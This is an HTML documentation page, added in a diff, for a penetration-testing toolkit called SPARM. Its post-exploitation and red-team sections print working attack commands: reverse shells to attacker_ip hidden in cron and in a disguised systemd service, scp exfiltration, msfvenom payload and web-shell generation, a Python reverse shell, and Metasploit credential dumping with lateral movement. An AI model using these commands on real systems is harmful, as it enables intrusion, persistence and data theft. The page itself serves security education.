@@ -1,0 +1,848 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>SPARM - Security Penetration & Attack Research Multitool Documentation</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #0f0f23 0%, #1a1a2e 100%);
+            color: #e0e0e0;
+            line-height: 1.6;
+        }
+
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 20px;
+        }
+
+        header {
+            background: linear-gradient(135deg, #2d2d44 0%, #16213e 100%);
+            border-radius: 10px;
+            padding: 30px;
+            margin-bottom: 30px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
+            text-align: center;
+        }
+
+        .logo {
+            font-size: 3em;
+            font-weight: bold;
+            color: #00ff41;
+            text-shadow: 0 2px 10px rgba(0, 255, 65, 0.5);
+            margin-bottom: 10px;
+        }
+
+        .subtitle {
+            color: #ff6b6b;
+            font-size: 1.2em;
+            margin-bottom: 15px;
+        }
+
+        .warning {
+            background: #ff4757;
+            color: white;
+            padding: 15px;
+            border-radius: 5px;
+            margin: 20px 0;
+            border-left: 5px solid #ff3742;
+        }
+
+        nav {
+            background: #2f3542;
+            border-radius: 10px;
+            padding: 20px;
+            margin-bottom: 30px;
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.3);
+        }
+
+        nav ul {
+            list-style: none;
+            display: flex;
+            flex-wrap: wrap;
+            gap: 20px;
+        }
+
+        nav a {
+            color: #00ff41;
+            text-decoration: none;
+            padding: 10px 15px;
+            border-radius: 5px;
+            transition: all 0.3s ease;
+            border: 1px solid transparent;
+        }
+
+        nav a:hover {
+            background: #00ff41;
+            color: #000;
+            border-color: #00ff41;
+        }
+
+        .section {
+            background: #2f3542;
+            border-radius: 10px;
+            padding: 30px;
+            margin-bottom: 30px;
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.3);
+        }
+
+        h1, h2, h3 {
+            color: #00ff41;
+            margin-bottom: 20px;
+        }
+
+        h1 {
+            font-size: 2.5em;
+            text-shadow: 0 2px 5px rgba(0, 255, 65, 0.3);
+        }
+
+        h2 {
+            font-size: 2em;
+            border-bottom: 2px solid #00ff41;
+            padding-bottom: 10px;
+        }
+
+        h3 {
+            font-size: 1.5em;
+            color: #ffa502;
+        }
+
+        .tool-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
+            gap: 20px;
+            margin-top: 20px;
+        }
+
+        .tool-card {
+            background: #1e2124;
+            border-radius: 8px;
+            padding: 20px;
+            border-left: 4px solid #00ff41;
+            transition: transform 0.3s ease;
+        }
+
+        .tool-card:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.4);
+        }
+
+        .tool-name {
+            color: #00ff41;
+            font-size: 1.3em;
+            font-weight: bold;
+            margin-bottom: 10px;
+        }
+
+        .tool-category {
+            color: #ffa502;
+            font-size: 0.9em;
+            margin-bottom: 15px;
+        }
+
+        .code-block {
+            background: #0f0f0f;
+            border: 1px solid #333;
+            border-radius: 5px;
+            padding: 15px;
+            margin: 15px 0;
+            font-family: 'Courier New', monospace;
+            overflow-x: auto;
+            color: #00ff41;
+        }
+
+        .command {
+            color: #ff6b6b;
+            font-weight: bold;
+        }
+
+        .methodology {
+            background: #16213e;
+            border-left: 4px solid #ff6b6b;
+            padding: 20px;
+            margin: 20px 0;
+            border-radius: 0 8px 8px 0;
+        }
+
+        .step {
+            background: #2d2d44;
+            padding: 15px;
+            margin: 10px 0;
+            border-radius: 5px;
+            border-left: 3px solid #ffa502;
+        }
+
+        .step-number {
+            color: #ffa502;
+            font-weight: bold;
+            font-size: 1.2em;
+        }
+
+        .combo-box {
+            background: #1a1a2e;
+            border: 2px solid #00ff41;
+            border-radius: 8px;
+            padding: 20px;
+            margin: 20px 0;
+        }
+
+        .combo-title {
+            color: #00ff41;
+            font-size: 1.2em;
+            font-weight: bold;
+            margin-bottom: 15px;
+        }
+
+        .privacy-section {
+            background: #2a2a40;
+            border: 2px solid #ff6b6b;
+            border-radius: 10px;
+            padding: 25px;
+            margin: 25px 0;
+        }
+
+        .privacy-title {
+            color: #ff6b6b;
+            font-size: 1.4em;
+            font-weight: bold;
+            margin-bottom: 15px;
+        }
+
+        @media (max-width: 768px) {
+            nav ul {
+                flex-direction: column;
+            }
+            
+            .tool-grid {
+                grid-template-columns: 1fr;
+            }
+            
+            .logo {
+                font-size: 2em;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <header>
+            <div class="logo">SPARM</div>
+            <div class="subtitle">Security Penetration & Attack Research Multitool - Interactive Cybersecurity Toolkit</div>
+            <div class="warning">
+                ⚠️ SPARM EDUCATIONAL TOOLKIT - AUTHORIZED LAB TESTING ONLY ⚠️<br>
+                This documentation covers the SPARM interactive cybersecurity toolkit designed for authorized penetration testing, security education, and ethical hacking practice in controlled lab environments. SPARM provides guided interfaces for professional security tools with built-in educational features and safety measures.
+            </div>
+        </header>
+
+        <nav>
+            <ul>
+                <li><a href="#overview">SPARM Overview</a></li>
+                <li><a href="#methodology">Testing Methodology</a></li>
+                <li><a href="#reconnaissance">SPARM Reconnaissance</a></li>
+                <li><a href="#exploitation">SPARM Exploitation</a></li>
+                <li><a href="#post-exploitation">Post-Exploitation</a></li>
+                <li><a href="#privacy">Privacy Protection</a></li>
+                <li><a href="#advanced">Advanced Features</a></li>
+                <li><a href="#best-practices">Best Practices</a></li>
+            </ul>
+        </nav>
+
+        <section id="overview" class="section">
+            <h2>🎯 SPARM Tool Overview</h2>
+            <p>SPARM (Security Penetration & Attack Research Multitool) is an interactive cybersecurity toolkit designed for authorized penetration testing, security education, and red team training in controlled lab environments.</p>
+            
+            <h3>🚀 SPARM Features</h3>
+            <div class="tool-grid">
+                <div class="tool-card">
+                    <div class="tool-name">🔍 OSINT Toolkit</div>
+                    <div class="tool-category">Information Gathering</div>
+                    <p>Interactive interface for TheHarvester, Amass, Sherlock, and other OSINT tools with guided parameter selection.</p>
+                </div>
+                
+                <div class="tool-card">
+                    <div class="tool-name">🌐 Network Reconnaissance</div>
+                    <div class="tool-category">Active Discovery</div>
+                    <p>Streamlined Nmap, Gobuster, and Nikto scanning with intelligent configuration options and result interpretation.</p>
+                </div>
+                
+                <div class="tool-card">
+                    <div class="tool-name">🛡️ Web Vulnerability Scanner</div>
+                    <div class="tool-category">Application Security</div>
+                    <p>Built-in web scanner plus integrated XSSer and WPScan with automated vulnerability detection and reporting.</p>
+                </div>
+                
+                <div class="tool-card">
+                    <div class="tool-name">💉 SQL Injection Toolkit</div>
+                    <div class="tool-category">Database Security</div>
+                    <p>Interactive SQLMap interface with manual testing capabilities and educational payload explanations.</p>
+                </div>
+                
+                <div class="tool-card">
+                    <div class="tool-name">🔑 Credential Access Tools</div>
+                    <div class="tool-category">Authentication Testing</div>
+                    <p>Guided Hydra, John the Ripper, and Hashcat operations with intelligent wordlist selection and progress monitoring.</p>
+                </div>
+                
+                <div class="tool-card">
+                    <div class="tool-name">🔒 Privacy Protection</div>
+                    <div class="tool-category">Lab Security</div>
+                    <p>Comprehensive VPN, Tor, and network isolation tools specifically designed for secure penetration testing environments.</p>
+                </div>
+            </div>
+            
+            <h3>Core Educational Principles</h3>
+            <ul>
+                <li><strong>Interactive Learning:</strong> Step-by-step guidance for complex security tools</li>
+                <li><strong>Experience Levels:</strong> Beginner, Intermediate, and Advanced modes</li>
+                <li><strong>Rich Terminal UI:</strong> Beautiful interface with colors, progress indicators, and clear feedback</li>
+                <li><strong>Authorized Testing Only:</strong> Built-in disclaimers and ethical use reminders</li>
+                <li><strong>Lab Environment Focus:</strong> Integrated privacy protection and isolation features</li>
+            </ul>
+        </section>
+
+        <section id="methodology" class="section">
+            <h2>🔄 Penetration Testing Methodology</h2>
+            <div class="methodology">
+                <h3>The Cyber Kill Chain</h3>
+                <p>SPARM follows industry-standard penetration testing methodologies:</p>
+                
+                <div class="step">
+                    <span class="step-number">1.</span> <strong>Reconnaissance</strong> - Information gathering and target analysis
+                </div>
+                <div class="step">
+                    <span class="step-number">2.</span> <strong>Scanning & Enumeration</strong> - Network and service discovery
+                </div>
+                <div class="step">
+                    <span class="step-number">3.</span> <strong>Vulnerability Assessment</strong> - Identifying security weaknesses
+                </div>
+                <div class="step">
+                    <span class="step-number">4.</span> <strong>Exploitation</strong> - Gaining initial access
+                </div>
+                <div class="step">
+                    <span class="step-number">5.</span> <strong>Post-Exploitation</strong> - Privilege escalation and persistence
+                </div>
+                <div class="step">
+                    <span class="step-number">6.</span> <strong>Reporting</strong> - Documenting findings and recommendations
+                </div>
+            </div>
+        </section>
+
+        <section id="reconnaissance" class="section">
+            <h2>🔍 SPARM Reconnaissance Capabilities</h2>
+            
+            <div class="tool-grid">
+                <div class="tool-card">
+                    <div class="tool-name">🎯 OSINT Toolkit</div>
+                    <div class="tool-category">Interactive Information Gathering</div>
+                    <p>SPARM provides guided interfaces for professional OSINT tools with intelligent parameter selection.</p>
+                    
+                    <div class="code-block">
+<span class="command"># SPARM OSINT Features:</span>
+• TheHarvester with source selection (Google, Bing, LinkedIn, Twitter)
+• Amass integration for comprehensive subdomain enumeration
+• Sherlock for social media username hunting
+• Interactive prompts for email limits and search parameters
+• Automatic result formatting and next-step suggestions
+                    </div>
+                    
+                    <h4>🚀 Key SPARM Advantages:</h4>
+                    <ul>
+                        <li>No need to memorize complex command syntax</li>
+                        <li>Built-in source selection and rate limiting</li>
+                        <li>Automatic result interpretation and highlighting</li>
+                        <li>Educational tooltips explaining each tool's purpose</li>
+                    </ul>
+                </div>
+
+                <div class="tool-card">
+                    <div class="tool-name">🌐 Network Reconnaissance</div>
+                    <div class="tool-category">Smart Active Discovery</div>
+                    <p>Intelligent network scanning with automated configuration and result analysis.</p>
+                    
+                    <div class="code-block">
+<span class="command"># SPARM Network Recon Features:</span>
+• Nmap with pre-configured scan profiles (Stealth, Aggressive, OS Detection)
+• Gobuster with automatic wordlist selection and extension handling
+• Nikto with SSL and comprehensive scan options
+• Intelligent timing and thread management
+• Color-coded result presentation with threat highlighting
+                    </div>
+                    
+                    <h4>🚀 Smart Features:</h4>
+                    <ul>
+                        <li>Automatic port range suggestions based on scan type</li>
+                        <li>Pre-configured timing templates for stealth vs speed</li>
+                        <li>Built-in wordlist management for directory brute-forcing</li>
+                        <li>Real-time progress indicators and timeout management</li>
+                    </ul>
+                </div>
+            </div>
+
+            <div class="combo-box">
+                <div class="combo-title">🎯 SPARM Reconnaissance Workflow</div>
+                <div class="code-block">
+<span class="command"># SPARM Guided Reconnaissance Process:</span>
+
+1. 🔍 **OSINT Phase** (SPARM OSINT Toolkit)
+   → Launch SPARM → Select "OSINT & Information Gathering"
+   → Choose TheHarvester for email/subdomain discovery
+   → SPARM guides through source selection and limits
+   → Results automatically parsed and highlighted
+
+2. 🌐 **Active Recon** (SPARM Network Reconnaissance)  
+   → Select "Network Reconnaissance" from main menu
+   → Choose Nmap with guided scan type selection
+   → SPARM automatically suggests optimal timing and ports
+   → Real-time progress with color-coded results
+
+3. 🛡️ **Web Discovery** (SPARM Web Vulnerability Scanner)
+   → Access "Web Vulnerability Assessment" 
+   → Integrated Gobuster with smart wordlist selection
+   → Automatic extension detection (.php, .html, .txt)
+   → Results categorized by potential security impact
+
+4. 📊 **Result Analysis**
+   → SPARM provides next-step recommendations
+   → Automatic categorization of findings by severity
+   → Built-in documentation of discovered assets
+   → Guided transition to exploitation phase
+                </div>
+            </div>
+        </section>
+
+        <section id="exploitation" class="section">
+            <h2>💥 SPARM Exploitation Capabilities</h2>
+            
+            <div class="tool-grid">
+                <div class="tool-card">
+                    <div class="tool-name">🛡️ Web Vulnerability Scanner</div>
+                    <div class="tool-category">Automated Web Application Testing</div>
+                    <p>SPARM's built-in web scanner provides comprehensive vulnerability detection with intelligent analysis.</p>
+                    
+                    <div class="code-block">
+<span class="command"># SPARM Web Scanner Features:</span>
+• Built-in SQL injection testing with common payloads
+• XSS detection across multiple contexts and vectors  
+• Path traversal testing with platform-specific payloads
+• Sensitive file discovery with intelligent path enumeration
+• Integrated XSSer for advanced XSS detection
+• WPScan integration for WordPress security assessment
+                    </div>
+                    
+                    <h4>🚀 Interactive Features:</h4>
+                    <ul>
+                        <li>Component selection (SQL, XSS, Path Traversal, Files)</li>
+                        <li>Real-time vulnerability detection with color-coded alerts</li>
+                        <li>Automatic payload explanation for educational purposes</li>
+                        <li>Next-step recommendations based on findings</li>
+                    </ul>
+                </div>
+
+                <div class="tool-card">
+                    <div class="tool-name">💉 SQL Injection Toolkit</div>
+                    <div class="tool-category">Database Security Testing</div>
+                    <p>Advanced SQLMap integration with educational manual testing capabilities.</p>
+                    
+                    <div class="code-block">
+<span class="command"># SPARM SQL Injection Features:</span>
+• Interactive SQLMap configuration with guided options
+• Database type selection (MySQL, PostgreSQL, Oracle, MSSQL)
+• Risk and level configuration with explanations
+• Technique selection (Boolean, Time-based, Error, UNION)
+• Automatic thread and timeout management
+• Manual payload testing with educational explanations
+                    </div>
+                    
+                    <h4>🚀 Educational Components:</h4>
+                    <ul>
+                        <li>Payload category explanation (Auth bypass, Union, Blind)</li>
+                        <li>Interactive technique selection with pros/cons</li>
+                        <li>Real-time command building with parameter validation</li>
+                        <li>Result interpretation and next-step guidance</li>
+                    </ul>
+                </div>
+
+                <div class="tool-card">
+                    <div class="tool-name">🔑 Credential Access Toolkit</div>
+                    <div class="tool-category">Authentication Security Testing</div>
+                    <p>Comprehensive credential testing with intelligent configuration and progress monitoring.</p>
+                    
+                    <div class="code-block">
+<span class="command"># SPARM Credential Tools Features:</span>
+• Hydra with service-specific default ports and configurations
+• John the Ripper with format detection and wordlist management
+• Hashcat with hash type selection and attack mode guidance
+• Automatic wordlist detection and suggestions
+• Progress monitoring with timeout management
+• Result parsing and success highlighting
+                    </div>
+                    
+                    <h4>🚀 Smart Configuration:</h4>
+                    <ul>
+                        <li>Service-specific parameter recommendations</li>
+                        <li>Automatic wordlist path detection and validation</li>
+                        <li>Hash format identification assistance</li>
+                        <li>Attack mode optimization suggestions</li>
+                    </ul>
+                </div>
+            </div>
+
+            <div class="combo-box">
+                <div class="combo-title">🔥 SPARM Exploitation Workflow: Web App Assessment</div>
+                <div class="code-block">
+<span class="command"># Complete SPARM Web Application Testing Process:</span>
+
+1. 🛡️ **Initial Web Assessment** (SPARM Web Vulnerability Scanner)
+   → Select "Web Vulnerability Assessment" from main menu
+   → Enter target URL with SPARM's intelligent URL validation
+   → Choose comprehensive scan (SQL, XSS, Path Traversal, Files)
+   → SPARM automatically tests with educational payload explanations
+
+2. 💉 **SQL Injection Deep Dive** (SPARM SQL Injection Toolkit)
+   → If SQL vulnerabilities found, access dedicated SQL toolkit
+   → SPARM guides through SQLMap configuration
+   → Select database type and techniques with explanations
+   → Monitor progress with real-time feedback and result interpretation
+
+3. 🔑 **Credential Testing** (SPARM Credential Access)
+   → Discover login pages or SSH services during recon
+   → Launch Hydra through SPARM's guided interface
+   → Select service type with automatic port detection
+   → Choose authentication method with wordlist recommendations
+
+4. 📊 **Result Compilation**
+   → SPARM aggregates findings across all modules
+   → Color-coded severity assessment and impact analysis
+   → Automated next-step recommendations
+   → Export-ready documentation for reporting
+                </div>
+            </div>
+        </section>
+
+        <section id="post-exploitation" class="section">
+            <h2>🚀 Post-Exploitation Phase</h2>
+            
+            <div class="tool-grid">
+                <div class="tool-card">
+                    <div class="tool-name">Privilege Escalation</div>
+                    <div class="tool-category">System Escalation</div>
+                    <p>Techniques to escalate privileges on compromised systems.</p>
+                    
+                    <div class="code-block">
+<span class="command"># LinPEAS - Linux privilege escalation scanner</span>
+curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
+
+<span class="command"># Manual enumeration</span>
+sudo -l                                     # Check sudo permissions
+find / -perm -u=s -type f 2>/dev/null      # Find SUID binaries
+crontab -l                                  # Check cron jobs
+cat /etc/passwd | grep -E '/bin/(bash|sh)'   # Find users with shell access
+
+<span class="command"># GTFOBins exploitation</span>
+# If vim has SUID: vim -c ':py import os; os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'
+                    </div>
+                </div>
+
+                <div class="tool-card">
+                    <div class="tool-name">Persistence Mechanisms</div>
+                    <div class="tool-category">Maintaining Access</div>
+                    <p>Methods to maintain persistent access to compromised systems.</p>
+                    
+                    <div class="code-block">
+<span class="command"># SSH key persistence</span>
+ssh-keygen -t rsa -N "" -f ~/.ssh/id_rsa
+cat ~/.ssh/id_rsa.pub >> ~/.ssh/authorized_keys
+
+<span class="command"># Cron job persistence</span>
+echo "* * * * * /bin/bash -c 'bash -i >& /dev/tcp/attacker_ip/4444 0>&1'" | crontab -
+
+<span class="command"># Service persistence (systemd)</span>
+cat > /etc/systemd/system/backdoor.service << EOF
+[Unit]
+Description=System Update Service
+[Service]
+ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/attacker_ip/4444 0>&1'
+[Install]
+WantedBy=multi-user.target
+EOF
+systemctl enable backdoor.service
+                    </div>
+                </div>
+
+                <div class="tool-card">
+                    <div class="tool-name">Data Exfiltration</div>
+                    <div class="tool-category">Information Gathering</div>
+                    <p>Techniques for collecting and exfiltrating sensitive data.</p>
+                    
+                    <div class="code-block">
+<span class="command"># Find sensitive files</span>
+find / -name "*.txt" -o -name "*.pdf" -o -name "*.doc" 2>/dev/null | head -20
+grep -r "password\|passwd\|secret" /etc/ 2>/dev/null
+find /home -name "*.ssh" -type d 2>/dev/null
+
+<span class="command"># Database extraction</span>
+mysqldump -u root -p database_name > dump.sql
+sqlite3 database.db ".dump" > sqlite_dump.sql
+
+<span class="command"># Secure transfer</span>
+tar -czf data.tar.gz /path/to/sensitive/data
+scp data.tar.gz user@attacker_ip:/tmp/
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <section id="privacy" class="section">
+            <h2>🔒 SPARM Privacy Protection Module</h2>
+            
+            <div class="privacy-section">
+                <div class="privacy-title">🛡️ Integrated Lab Environment Security</div>
+                <p>SPARM includes a comprehensive Privacy Protection module designed specifically for secure penetration testing environments:</p>
+                
+                <div class="tool-grid">
+                    <div class="tool-card">
+                        <div class="tool-name">🌐 VPN Integration</div>
+                        <div class="tool-category">Secure External Connections</div>
+                        <div class="code-block">
+<span class="command"># SPARM VPN Features:</span>
+• OpenVPN configuration with guided setup
+• WireGuard support for modern VPN protocols
+• Automatic IP change verification
+• Built-in connection testing and validation
+• Manual VPN service recommendations and setup guides
+                        </div>
+                    </div>
+                    
+                    <div class="tool-card">
+                        <div class="tool-name">🧅 Tor Network Setup</div>
+                        <div class="tool-category">Anonymous Browsing</div>
+                        <div class="code-block">
+<span class="command"># SPARM Tor Features:</span>
+• Automatic Tor installation and configuration
+• Circuit establishment monitoring
+• Real-time Tor connectivity verification
+• IP address validation and change confirmation
+• Educational explanations of Tor network benefits
+                        </div>
+                    </div>
+                    
+                    <div class="tool-card">
+                        <div class="tool-name">🔒 Network Isolation</div>
+                        <div class="tool-category">Lab Environment Containment</div>
+                        <div class="code-block">
+<span class="command"># SPARM Isolation Features:</span>
+• Network namespace creation and management
+• Iptables rule configuration for lab networks
+• VM isolation guidance and best practices
+• Traffic monitoring setup with tcpdump/Wireshark
+• Real-time connection status monitoring
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="combo-box">
+                <div class="combo-title">🔥 SPARM Privacy Protection Workflow</div>
+                <div class="code-block">
+<span class="command"># Complete SPARM Privacy Setup Process:</span>
+
+1. 🌐 **VPN Configuration** (SPARM Privacy Protection)
+   → Select "Privacy Protection & Lab Security" from main menu
+   → Choose "VPN Configuration" for secure external traffic
+   → SPARM guides through OpenVPN or WireGuard setup
+   → Automatic connection verification and IP change confirmation
+
+2. 🧅 **Tor Network Setup** (Anonymous Browsing)
+   → Access "Tor Network Setup" from privacy menu
+   → SPARM automatically installs and configures Tor service
+   → Real-time circuit establishment monitoring
+   → Verification of anonymous browsing capabilities
+
+3. 🔒 **Network Isolation** (Lab Containment)
+   → Select "Network Isolation" for environment security
+   → Choose from namespace creation, iptables rules, or VM isolation
+   → SPARM provides guided setup with educational explanations
+   → Automatic validation of isolation effectiveness
+
+4. 📊 **Status Monitoring** (Real-time Protection Status)
+   → Access "Status Check" for comprehensive protection overview
+   → Real-time monitoring of VPN, Tor, and isolation status
+   → Network interface information and connection verification
+   → Color-coded security status with actionable recommendations
+                </div>
+            </div>
+
+            <h3>🚀 SPARM Privacy Advantages</h3>
+            <ul>
+                <li><strong>Integrated Security:</strong> Privacy protection built into the penetration testing workflow</li>
+                <li><strong>Educational Focus:</strong> Learn privacy technologies while using them practically</li>
+                <li><strong>Real-time Monitoring:</strong> Continuous verification of protection status</li>
+                <li><strong>Guided Setup:</strong> No need to memorize complex configuration commands</li>
+                <li><strong>Lab-Specific:</strong> Tailored for cybersecurity research and authorized testing</li>
+            </ul>
+        </section>
+
+        <section id="advanced" class="section">
+            <h2>🎖️ Advanced Red Team Techniques</h2>
+            
+            <div class="tool-grid">
+                <div class="tool-card">
+                    <div class="tool-name">Command & Control (C2)</div>
+                    <div class="tool-category">Advanced Persistence</div>
+                    <p>Setting up C2 infrastructure for advanced persistent threats simulation.</p>
+                    
+                    <div class="code-block">
+<span class="command"># Metasploit Framework</span>
+msfconsole
+use exploit/multi/handler
+set payload windows/meterpreter/reverse_tcp
+set LHOST your_ip
+set LPORT 4444
+exploit
+
+<span class="command"># Empire Framework</span>
+./empire
+listeners
+uselistener http
+set Host your_ip
+set Port 8080
+execute
+
+<span class="command"># Cobalt Strike (Licensed)</span>
+# Start team server
+./teamserver your_ip password
+# Connect via client and create listeners
+                    </div>
+                </div>
+
+                <div class="tool-card">
+                    <div class="tool-name">Payload Generation</div>
+                    <div class="tool-category">Exploitation Tools</div>
+                    <p>Creating custom payloads for various attack scenarios.</p>
+                    
+                    <div class="code-block">
+<span class="command"># msfvenom - Payload generator</span>
+# Windows reverse shell
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=your_ip LPORT=4444 -f exe > shell.exe
+
+# Linux reverse shell
+msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=your_ip LPORT=4444 -f elf > shell.elf
+
+# Web shells
+msfvenom -p php/meterpreter/reverse_tcp LHOST=your_ip LPORT=4444 -f raw > shell.php
+
+<span class="command"># Custom payloads</span>
+# Python reverse shell
+python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("your_ip",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+                    </div>
+                </div>
+
+                <div class="tool-card">
+                    <div class="tool-name">Lateral Movement</div>
+                    <div class="tool-category">Network Expansion</div>
+                    <p>Techniques for moving laterally through compromised networks.</p>
+                    
+                    <div class="code-block">
+<span class="command"># SMB enumeration and exploitation</span>
+smbclient -L //target_ip
+smbmap -H target_ip
+enum4linux target_ip
+
+<span class="command"># WMI and PowerShell</span>
+# PowerShell Empire for lateral movement
+# Invoke-SMBExec for SMB lateral movement
+# Invoke-WMIExec for WMI-based movement
+
+<span class="command"># SSH pivoting</span>
+ssh -L 8080:internal_target:80 user@compromised_host
+# Access internal services through tunnel
+                    </div>
+                </div>
+            </div>
+
+            <div class="combo-box">
+                <div class="combo-title">⚡ Advanced Combo: Full Red Team Simulation</div>
+                <div class="code-block">
+<span class="command"># Phase 1: Initial compromise</span>
+msfvenom -p windows/meterpreter/reverse_https LHOST=your_ip LPORT=443 -f exe > payload.exe
+# Social engineering delivery of payload
+
+<span class="command"># Phase 2: Establish C2</span>
+msfconsole -r handler.rc    # Pre-configured handler
+# Establish encrypted C2 channel
+
+<span class="command"># Phase 3: Reconnaissance</span>
+# From meterpreter session:
+run post/windows/gather/enum_domain
+run post/windows/gather/hashdump
+run post/windows/gather/credentials/credential_collector
+
+<span class="command"># Phase 4: Lateral movement</span>
+use exploit/windows/smb/psexec
+set RHOSTS internal_targets
+set SMBUser captured_user
+set SMBPass captured_hash
+exploit
+
+<span class="command"># Phase 5: Persistence</span>
+run post/windows/manage/persistence_exe
+run post/windows/manage/migrate
+                </div>
+            </div>
+        </section>
+
+        <section id="best-practices" class="section">
+            <h2>✅ Best Practices & Ethics</h2>
+            
+            <h3>Legal and Ethical Guidelines</h3>
+            <ul>
+                <li><strong>Authorization:</strong> Always ensure proper written authorization before testing</li>
+                <li><strong>Scope Definition:</strong> Clearly define testing scope and boundaries</li>
+                <li><strong>Data Protection:</strong> Handle any discovered data with extreme care</li>
+                <li><strong>Responsible Disclosure:</strong> Report vulnerabilities through proper channels</li>
+                <li><strong>Documentation:</strong> Maintain detailed logs and evidence of all activities</li>
+            </ul>
+
+            <h3>Lab Environment Management</h3>
+            <div class="methodology">
+                <div class="step">
+                    <span class="step-number">1.</span> <strong>Isolation:</strong> Keep lab environments completely isolated from production networks
+                </div>
+                <div class="step">
+                    <span class="step-number">2.</span> <strong>Snapshots:</strong> Take VM snapshots before any testing activities
+                </div>
+                <div class="step">
+                    <span class="step-number">3.</span> <strong>Monitoring:</strong> Log all activities for learning and compliance
+                </div>
+                <div class="step">
+                    <span class="step-number">4.</span> <strong>Cleanup:</strong> Properly clean up after testing sessions
+                </div>
+                <div class="step">
+                    <span class="step-number">5.</span> <strong>Updates:</strong> Keep tools and systems updated for accurate testing
+                </div>
+            </div>
+
+            <h3>Professional Development</h3>
+            <ul>
+                <li><strong>Certifications:</strong> Pursue OSCP, CEH, CISSP, or other relevant certifications</li>
+                <li><strong>Continuous Learning:</strong> Stay updated with latest attack techniques and defenses</li>
+                <li><strong>Community Engagement:</strong> Participate in CTFs, bug bounty programs, and security communities</li>
+                <li><strong>Knowledge Sharing:</strong> Contribute to the cybersecurity community through responsible research</li>
+            </ul>
+        </section>
+
+        <footer style="text-align: center; padding: 30px; color: #888;">
+            <p>&copy; 2024 SPARM Documentation - Educational Use Only</p>
+            <p>Remember: With great power comes great responsibility. Use these tools ethically and legally.</p>
+        </footer>
+    </div>
+</body>
+</html>
